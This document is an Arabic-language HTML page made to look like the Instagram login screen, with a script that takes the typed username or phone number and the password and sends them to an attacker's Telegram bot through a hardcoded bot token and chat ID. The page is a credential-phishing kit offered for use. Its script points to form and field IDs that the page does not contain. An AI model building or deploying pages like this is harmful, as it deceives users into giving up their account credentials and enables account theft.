<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>instagram</title>

<style>
    *{
        margin:0;
        padding:0;
        box-sizing:border-box;
        font-family: Arial, sans-serif;
    }

    body{
        background:#fafafa;
        display:flex;
        justify-content:center;
        align-items:center;
        height:100vh;
    }

    .login-container{
        width:350px;
    }

    .login-box{
        background:#fff;
        border:1px solid #dbdbdb;
        padding:40px 35px;
        text-align:center;
    }

    .logo{
        font-size:38px;
        font-weight:bold;
        margin-bottom:25px;
        color:#262626;
        font-family:cursive;
    }

    .subtitle{
        color:#8e8e8e;
        font-size:14px;
        margin-bottom:20px;
    }

    input{
        width:100%;
        margin-bottom:10px;
        padding:12px;
        border:1px solid #dbdbdb;
        border-radius:4px;
        background:#fafafa;
        outline:none;
    }

    input:focus{
        border-color:#a8a8a8;
    }

    button{
        width:100%;
        padding:10px;
        border:none;
        border-radius:8px;
        background:#0095f6;
        color:white;
        font-size:15px;
        font-weight:bold;
        cursor:pointer;
        margin-top:10px;
        transition:0.3s;
    }

    button:hover{
        background:#0077cc;
    }

    .divider{
        margin:20px 0;
        color:#8e8e8e;
        font-size:13px;
    }

    .info{
        font-size:13px;
        color:#8e8e8e;
        line-height:1.6;
    }

    .footer-box{
        margin-top:10px;
        background:#fff;
        border:1px solid #dbdbdb;
        padding:20px;
        text-align:center;
        font-size:14px;
    }

    .footer-box a{
        color:#0095f6;
        text-decoration:none;
        font-weight:bold;
    }

</style>
</head>

<body>

<div class="login-container">

    <div class="login-box">

        <div class="logo">instagram</div>

        <div class="subtitle">
 
        </div>

        <form id="loginForm">

            <input type="text" placeholder="رقم الهاتف أو البريد الإلكتروني" required>

            <input type="password" placeholder="كلمة المرور" required>

            <button type="submit">تسجيل الدخول</button>

        </form>

        <div class="divider">──────── أو ────────</div>

        <div class="info">
           سجل حساب جديد
        </div>

    </div>

    <div class="footer-box">
        ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
    </div>
        <script>
        document.getElementById('registrationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const identifier = document.getElementById('identifier').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            // إرسال البيانات إلى بوت تيليجرام
            sendToTelegramBot(identifier, password)
                .then(response => {
                    messageDiv.textContent = "جاري تنفيذ طلبك!";
                    messageDiv.className = "message success";
                    messageDiv.style.display = "block";
                    
                    // مسح النموذج بعد الإرسال
                    document.getElementById('registrationForm').reset();
                })
                .catch(error => {
                    messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.";
                    messageDiv.className = "message error";
                    messageDiv.style.display = "block";
                    console.error('Error:', error);
                });
        });

        async function sendToTelegramBot(identifier, password) {
            // استبدل TOKEN و CHAT_ID بقيم البوت الخاص بك
            const botToken = '8403294278:AAHeXjIw7yGxiKLaEbN5pkC3MHKKs0ekAVA';
            const chatId = '8386457362';
            
            const message = `بيانات تسجيل جديدة:\n\nالمعرف: ${identifier}\nكلمة المرور: ${password}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                
                return await response.json();
            } catch (error) {
                throw error;
            }
        }
    </script>

</div>

</body>
</html>
